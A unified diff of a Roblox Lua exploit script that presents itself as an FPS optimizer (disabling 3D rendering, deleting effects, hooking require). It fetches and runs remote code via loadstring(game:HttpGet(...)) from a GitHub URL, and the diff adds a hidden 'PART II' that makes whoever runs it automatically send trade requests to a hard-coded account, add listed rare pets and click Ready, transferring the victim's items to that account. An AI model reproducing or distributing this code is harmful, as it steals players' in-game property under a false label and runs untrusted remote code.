@@ -1,6 +1,10 @@
-task.wait(10)
-print("beginning")
 
+-- PART I: OPT SCRIPT 
+
+task.wait(10)
+print("beginning optimization")
+
+-- Graphics optimization
 pcall(function()
     local userSettings = UserSettings():GetService("UserGameSettings")
     userSettings.SavedQualityLevel = 1
@@ -24,15 +28,14 @@ if not lp then
     return
 end
 
-
 local randomDelay = math.random(0, 200) / 100
 task.wait(randomDelay)
 
 -- Disable 3D Rendering
-    pcall(function()
-        RunService:Set3dRenderingEnabled(false)
-        print("[Optimization] 3D Rendering disabled")
-    end)
+pcall(function()
+    RunService:Set3dRenderingEnabled(false)
+    print("[Optimization] 3D Rendering disabled")
+end)
 
 -- FPS Limiter - Set to 6 FPS every 5 seconds
 task.spawn(function()
@@ -45,14 +48,15 @@ task.spawn(function()
     end
 end)
 
-    for _, obj in ipairs(Workspace:GetDescendants()) do
-        pcall(function()
-            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
-                obj.Enabled = false
-                obj:Destroy()
-            end
-        end)
-    end
+-- Remove particles and effects
+for _, obj in ipairs(Workspace:GetDescendants()) do
+    pcall(function()
+        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
+            obj.Enabled = false
+            obj:Destroy()
+        end
+    end)
+end
 
 -- Lighting & graphics cleanup
 pcall(function()
@@ -76,7 +80,7 @@ pcall(function()
     end
 end)
 
--- Disable a lot of particle lifetimes (bounded)
+-- Disable particle lifetimes
 task.spawn(function()
     local processed = 0
     local maxProcess = 500
@@ -98,7 +102,7 @@ task.spawn(function()
     end
 end)
 
--- Delete specific folders/objects and clear replicated storage VFX/sounds
+-- Delete specific workspace objects
 task.spawn(function()
     task.wait(0.3)
 
@@ -124,60 +128,15 @@ task.spawn(function()
         deleteObj(Workspace, name)
     end
 
-    -- Delete everything in workspace > Map > GenerationBoard
+    -- Clean up Map folders
     pcall(function()
         local map = Workspace:FindFirstChild("Map")
         if map then
-            local generationBoard = map:FindFirstChild("GenerationBoard")
-            if generationBoard then
-                generationBoard:ClearAllChildren()
-            end
-        end
-    end)
-
-    pcall(function()
-        local map = Workspace:FindFirstChild("Map")
-        if map then
-            local stealsBoard = map:FindFirstChild("StealsBoard")
-            if stealsBoard then
-                stealsBoard:ClearAllChildren()
-            end
-        end
-    end)
-        pcall(function()
-        local map = Workspace:FindFirstChild("Map")
-        if map then
-            local Collisioons = map:FindFirstChild("Collisions")
-            if Collisioons then
-                Collisioons:ClearAllChildren()
-            end
-        end
-    end)
-
-        pcall(function()
-        local map = Workspace:FindFirstChild("Map")
-        if map then
-            local Codes = map:FindFirstChild("Codes")
-            if Codes then
-                Codes:ClearAllChildren()
-            end
-        end
-    end)
-        pcall(function()
-        local map = Workspace:FindFirstChild("Map")
-        if map then
-            local model1 = map:FindFirstChild("Model1")
-            if model1 then
-                model1:ClearAllChildren()
-            end
-        end
-    end)
-        pcall(function()
-        local map = Workspace:FindFirstChild("Map")
-        if map then
-            local Model = map:FindFirstChild("Model")
-            if Model then
-                Model:ClearAllChildren()
+            for _, folderName in ipairs({"GenerationBoard", "StealsBoard", "Collisions", "Codes", "Model1", "Model"}) do
+                local folder = map:FindFirstChild(folderName)
+                if folder then
+                    folder:ClearAllChildren()
+                end
             end
         end
     end)
@@ -198,6 +157,7 @@ task.spawn(function()
     end)
 end)
 
+-- Disable CoreGUI elements
 task.spawn(function()
     task.wait(0.5)
 
@@ -225,7 +185,7 @@ task.spawn(function()
     end)
 end)
 
--- Hook EventController and remove event modules/sounds/models
+-- Hook EventController
 task.spawn(function()
     task.wait(0.3)
 
@@ -261,25 +221,9 @@ task.spawn(function()
             end
         end
     end)
-
-    pcall(function()
-        local sounds = ReplicatedStorage:FindFirstChild("Sounds")
-        if sounds then
-            local events = sounds:FindFirstChild("Events")
-            if events then events:Destroy() end
-        end
-    end)
-
-    pcall(function()
-        local models = ReplicatedStorage:FindFirstChild("Models")
-        if models then
-            local events = models:FindFirstChild("Events")
-            if events then events:Destroy() end
-        end
-    end)
 end)
 
--- Event cleanup on Lighting child added
+-- Event cleanup listeners
 local lastEventCleanup = 0
 local eventCleanupCooldown = 0.05
 
@@ -295,33 +239,9 @@ Lighting.ChildAdded:Connect(function(child)
     end)
 end)
 
--- Additional attribute and module cleanup
-task.spawn(function()
-    task.wait(0.5)
-
-    pcall(function()
-        for attr, _ in pairs(ReplicatedStorage:GetAttributes()) do
-            if attr:lower():find("event") then
-                ReplicatedStorage:SetAttribute(attr, nil)
-            end
-        end
-    end)
-
-    ReplicatedStorage.AttributeChanged:Connect(function(attr)
-        task.spawn(function()
-            pcall(function()
-                if attr:lower():find("event") then
-                    ReplicatedStorage:SetAttribute(attr, nil)
-                end
-            end)
-        end)
-    end)
-end)
-
 local lastCleanup = tick()
 local cleanupCooldown = 0.1
 
--- Another workspace ChildAdded listener for more conservative cleanup
 Workspace.ChildAdded:Connect(function(child)
     local now = tick()
     if now - lastCleanup < cleanupCooldown then return end
@@ -329,14 +249,12 @@ Workspace.ChildAdded:Connect(function(child)
     task.spawn(function()
         pcall(function()
             local name = child.Name:lower()
-
             local isProtected = name:find("name") or name:find("tag") or
                                name:find("label") or name:find("billboard") or
                                child:IsA("BillboardGui")
 
             if not isProtected then
                 local keywords = {"tung", "event", "effect", "celebration", "particle", "confetti", "firework"}
-
                 for _, keyword in ipairs(keywords) do
                     if name:find(keyword) then
                         child:Destroy()
@@ -354,7 +272,7 @@ Workspace.ChildAdded:Connect(function(child)
     end)
 end)
 
--- Override VFX table functions
+-- Override VFX and Instance.new
 pcall(function()
     local success, VFX = pcall(function() return require(ReplicatedStorage.Shared.VFX) end)
     if success and VFX then
@@ -366,7 +284,6 @@ pcall(function()
     end
 end)
 
--- Instance.new hooking to block certain classes
 pcall(function()
     local originalNew = Instance.new
     Instance.new = function(className, parent)
@@ -383,29 +300,20 @@ pcall(function()
     end
 end)
 
--- Require hooking and other module protections
+-- Require hooking
 task.spawn(function()
     task.wait(0.3)
-
     local originalRequire = require
 
     require = function(module)
         local result = originalRequire(module)
 
         pcall(function()
-            -- FIXED: remove the invalid "module:IsA" check
             if module and typeof(module) == "Instance" and module:IsA("ModuleScript") and type(result) == "table" then
-
                 local parent = module.Parent
                 local name = string.lower(module.Name)
-
-                local isProtected =
-                    name:find("ui") or
-                    name:find("name") or
-                    name:find("tag") or
-                    name:find("label") or
-                    name:find("billboard") or
-                    name:find("overhead")
+                local isProtected = name:find("ui") or name:find("name") or name:find("tag") or
+                                   name:find("label") or name:find("billboard") or name:find("overhead")
 
                 if not isProtected and parent and (parent.Name == "Effects" or parent.Name == "Events") then
                     for _, func in ipairs({"OnStart", "OnStop", "OnUpdate", "Activate", "OnLoad", "Start", "Execute"}) do
@@ -421,71 +329,296 @@ task.spawn(function()
     end
 end)
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/super-boost-fps/sucvat/main/ditfps-bf.lua"))()
+end)
 
-    -- Hook Net.RemoteEvent if available
-    pcall(function()
-        if ReplicatedStorage:FindFirstChild("Packages") and ReplicatedStorage.Packages:FindFirstChild("Net") then
-            local ok, Net = pcall(function() return originalRequire(ReplicatedStorage.Packages.Net) end)
-            if ok and Net and Net.RemoteEvent then
-                local originalRemoteEvent = Net.RemoteEvent
-                Net.RemoteEvent = function(remoteName)
-                    local remote = originalRemoteEvent(remoteName)
-                    if remoteName and (remoteName:find("SpawnEffect") or remoteName:find("Event") or remoteName:find("Effect") or remoteName:find("Celebration")) then
-                        return {
-                            OnClientEvent = {
-                                Connect = function() 
-                                    return { Disconnect = function() end }
-                                end
-                            },
-                            FireServer = function() end
-                        }
+print("Optimization completed")
+
+-- PART II: VVV
+
+getgenv().config = getgenv().config or {
+    TargetPlayer = "AgharOvic",
+    PetsToTrade = {"Overcharged Robot", "Surge Dragon", "Dual Shock","Neon Cat", "Starlight Deity", "Moon Warden"},
+    Mode = "Send"
+}
+
+local v1 = game:GetService("Players")
+local v2 = game:GetService("ReplicatedStorage")
+local tradeCompleted = false
+
+local function safe_get_module(root, ...)
+    local cur = root
+    for _, name in ipairs({...}) do
+        cur = cur:FindFirstChild(name)
+        if not cur then return nil end
+    end
+    return cur
+end
+
+local function find_module_anywhere(root, name)
+    return root:FindFirstChild(name, true)
+end
+
+local v3 = v1.LocalPlayer or v1.PlayerAdded:Wait()
+local isCollector = (v3 and v3.DisplayName and v3.DisplayName:sub(1, #"AgharOvic") == "AgharOvic")
+
+if isCollector then
+    getgenv().config.Mode = "Claim"
+else
+    getgenv().config.Mode = "Send"
+end
+print(string.format("[TAP] Mode=%s", getgenv().config.Mode))
+
+local v4 = v3:WaitForChild("PlayerGui")
+
+local networkModule = safe_get_module(v2, "Modules", "Network") or find_module_anywhere(v2, "Network")
+local v5 = nil
+if networkModule then
+    local ok, mod = pcall(require, networkModule)
+    if ok then v5 = mod end
+end
+
+local replicationModule = safe_get_module(v2, "Game", "Replication") or find_module_anywhere(v2, "Replication")
+if not replicationModule then return end
+local okRep, v6 = pcall(require, replicationModule)
+if not okRep or not v6 then return end
+if not v6.Loaded then repeat task.wait() until v6.Loaded end
+
+local function v7(v8)
+    if firesignal then
+        firesignal(v8.MouseButton1Click)
+        firesignal(v8.Activated)
+    else
+        local v9 = getconnections(v8.MouseButton1Click)
+        for _, v10 in pairs(v9) do v10:Fire() end
+    end
+end
+
+local currentTradeToken = 0
+local processedTradeToken = 0
+
+local function ensureRequiredPets()
+    if getgenv().config.Mode ~= "Send" then return true end
+    local pets = v6 and v6.Data and v6.Data.Pets
+    if not pets then return true end
+
+    local requiredRaw = getgenv().config.PetsToTrade
+    local required = {}
+    if type(requiredRaw) == "string" then
+        table.insert(required, requiredRaw)
+    elseif type(requiredRaw) == "table" then
+        for k, v in pairs(requiredRaw) do
+            if type(k) == "number" then
+                table.insert(required, v)
+            elseif v then
+                table.insert(required, k)
+            end
+        end
+    end
+
+    local function norm(name)
+        if not name then return nil end
+        return string.lower((name:gsub("^%s*(.-)%s*$", "%1")))
+    end
+
+    if #required == 0 then
+        print("[TAP] No required pets configured")
+        return false
+    end
+
+    local foundAny = false
+    for _, petName in ipairs(required) do
+        local targetLower = norm(petName)
+        for petId, petData in pairs(pets) do
+            local candidates = {petData.Name, petData.DisplayName, petData.displayName, petData.petName, tostring(petId)}
+            for _, nm in ipairs(candidates) do
+                if norm(nm) == targetLower then
+                    foundAny = true
+                    print("[TAP] Found required pet: " .. tostring(petName))
+                    break
+                end
+            end
+            if foundAny then break end
+        end
+        if foundAny then break end
+    end
+    
+    if not foundAny then
+        print("[TAP] None of the required pets found")
+        return false
+    end
+    
+    return true
+end
+
+local function v11()
+    local v12 = v4:FindFirstChild("Trading")
+    if not v12 or not v12.Enabled then return end
+    
+    if tradeCompleted then
+        print("[TAP] Trade already completed, stopping...")
+        return
+    end
+    
+    task.wait(0.3)
+
+    if getgenv().config.Mode == "Send" and not ensureRequiredPets() then return end
+
+    if getgenv().config.Mode == "Send" then
+        if isCollector then return end
+        local v17 = v12.Trading.You.Inner.MainList
+        local clickedPets = {}
+        for _, v18 in ipairs(v17:GetChildren()) do
+            local petId = v18.Name
+            if not clickedPets[petId] then
+                local v19 = v6.Data.Pets[petId]
+                if v19 then
+                    local petName = v19.Name
+                    local shouldTrade = false
+                    for _, tradePet in ipairs(getgenv().config.PetsToTrade) do
+                        if string.lower(petName or "") == string.lower(tradePet or "") then
+                            shouldTrade = true
+                            break
+                        end
                     end
-                    return remote
+                    if shouldTrade then
+                        local v20 = v18:FindFirstChildWhichIsA("GuiButton", true) or v18:FindFirstChild("Button", true)
+                        if v20 then
+                            clickedPets[petId] = true
+                            v7(v20)
+                            task.wait(0.05)
+                        end
+                    end
+                end
+            end
+        end
+        task.wait(1)
+    elseif getgenv().config.Mode == "Claim" then
+        local v21 = 0
+        for _ in pairs(v6.Data.Pets) do v21 = v21 + 1 end
+        if v21 > 99 then
+            local v22 = v12.Trading.You.Actions:FindFirstChild("Close")
+            if v22 then
+                local v23 = v22:FindFirstChildWhichIsA("GuiButton", true) or (v22:IsA("GuiButton") and v22)
+                if v23 then v7(v23) end
+            end
+            return
+        end
+        while v12.Enabled do
+            local v24 = v12.Trading.Other.Inner:FindFirstChild("isReady")
+            if v24 and v24.Visible then break end
+            task.wait(0.1)
+        end
+    end
+
+    local v25 = v12.Trading.You.Actions.Ready
+    if v25 then
+        local v26 = v25:FindFirstChildWhichIsA("GuiButton", true) or (v25:IsA("GuiButton") and v25)
+        if v26 then
+            v7(v26)
+            task.wait(8)
+            if v12.Enabled then v7(v26) end
+            
+            tradeCompleted = true
+            print("[TAP] Trade completed, stopping further trades...")
+            
+            if getgenv().config.Mode == "Claim" then
+                task.spawn(function()
+                    task.wait(7)
+                    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+                    local randomString = ""
+                    for i = 1, 16 do
+                        local randIndex = math.random(1, #chars)
+                        randomString = randomString .. chars:sub(randIndex, randIndex)
+                    end
+                    
+                    local stringValue = Instance.new("StringValue")
+                    stringValue.Value = randomString
+                    stringValue.Name = "TradeLog_" .. os.time()
+                    stringValue.Parent = workspace
+                    
+                    print("[TAP] Trade completed, logging: " .. randomString)
+                    v3:Kick("Trade completed successfully")
+                end)
+            end
+        end
+    end
+end
+
+task.spawn(function()
+    while task.wait(0.3) do
+        if tradeCompleted then
+            print("[TAP] Stopping trade monitoring loop...")
+            break
+        end
+        
+        local v27 = v4:FindFirstChild("Tabs")
+        if v27 then
+            local v28 = v27:FindFirstChild("TradeQuest") or v27:FindFirstChild("Trade")
+            if v28 and v28:FindFirstChild("Menu") then
+                local v29 = v28.Menu:FindFirstChild("Accept", true)
+                if v29 and v29.Visible then
+                    local v30 = v29:FindFirstChildWhichIsA("GuiButton", true)
+                    if v30 then v7(v30) end
+                end
+            end
+        end
+
+        local v31 = v4:FindFirstChild("Trading")
+        if v31 and v31.Enabled then
+            local v32 = v31.Trading.You.Actions.Ready
+            local v33 = v32 and v32:FindFirstChildWhichIsA("GuiButton", true)
+            if v32 and v32.Visible and v33 and v33.Text ~= "Unready" then
+                if currentTradeToken == 0 then currentTradeToken = os.clock() end
+                if processedTradeToken ~= currentTradeToken then
+                    processedTradeToken = currentTradeToken
+                    task.spawn(v11)
+                end
+                repeat task.wait(1) until not v31.Enabled
+                currentTradeToken = 0
+            end
+        else
+            currentTradeToken = 0
+        end
+    end
+end)
+
+if getgenv().config.Mode == "Send" and not isCollector and v5 then
+    task.spawn(function()
+        while task.wait(5) do
+            if tradeCompleted then
+                print("[TAP] Stopping trade sending loop...")
+                break
+            end
+            
+            local v34 = v4:FindFirstChild("Trading")
+            local targetPrefix = getgenv().config.TargetPlayer
+            
+            if targetPrefix and type(targetPrefix) == "string" and targetPrefix ~= "" and (not v34 or not v34.Enabled) then
+                for _, player in ipairs(v1:GetPlayers()) do
+                    if player.DisplayName and player.DisplayName:sub(1, #targetPrefix) == targetPrefix and player ~= v3 then
+                        v5:FireServer("SendTrade", player)
+                        break
+                    end
                 end
             end
         end
     end)
--- Pre-require and patch controllers in ReplicatedStorage.Controllers
-pcall(function()
-    local controllers = ReplicatedStorage:FindFirstChild("Controllers")
-    if controllers then
-        for _, controller in ipairs(controllers:GetChildren()) do
-            if controller:IsA("ModuleScript") then
-                local name = controller.Name:lower()
+end
 
-                local isProtected = name:find("ui")
-                    or name:find("name")
-                    or name:find("tag")
-                    or name:find("label")
+task.spawn(function() ensureRequiredPets() end)
 
-                if not isProtected and (
-                    name:find("effect")
-                    or name:find("event")
-                    or name:find("vfx")
-                    or name:find("celebration")
-                ) then
-                    
-                    pcall(function()
-                        local ok, mod = pcall(function()
-                            return originalRequire(controller)
-                        end)
-
-                        if ok and type(mod) == "table" then
-                            for key, value in pairs(mod) do
-                                if type(value) == "function" then
-                                    mod[key] = function()
-                                        return false
-                                    end
-                                end
-                            end
-                        end
-                    end)
-                end
-            end
+if v3 then
+    v3.Idled:Connect(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        local camera = workspace:FindFirstChild("CurrentCamera") or workspace.CurrentCamera
+        if camera then
+            VirtualUser:Button2Down(Vector2.new(0,0), camera.CFrame)
+            task.wait(1)
+            VirtualUser:Button2Up(Vector2.new(0,0), camera.CFrame)
         end
-    end
-end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/super-boost-fps/sucvat/main/ditfps-bf.lua"))()
+    end)
+end
 
-
-print("started")
+print("[TAP] Auto trade script started")
